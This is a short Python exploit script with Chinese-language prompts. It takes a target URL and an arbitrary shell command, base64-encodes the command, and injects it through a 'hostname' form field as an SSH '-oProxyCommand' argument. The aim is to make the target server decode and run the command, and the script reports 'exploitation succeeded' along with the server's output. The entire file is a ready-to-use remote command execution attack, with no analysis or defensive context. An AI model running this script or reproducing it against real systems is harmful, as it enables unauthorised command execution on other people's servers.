import requests
import base64
from urllib.parse import quote

url = input("请输入url:")
cmd = input("请输入想要执行的命令:")

def exploit(url, cmd):
    # base64编码
    encodeb64 = base64.b64encode(cmd.encode('utf-8')).decode('utf-8')
    # url编码
    encodeb64_url = quote(encodeb64)
    # 构造payload
    payload = f"x+-oProxyCommand%3decho%09{encodeb64_url}|base64%09-d|sh"
    data = {
        "hostname": payload,
        "username": 1,
        "password": 2
    }
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print("[+]利用成功")
        print(response.text)
    else:
        print("利用失败")

if __name__ == "__main__":
    exploit(url, cmd)








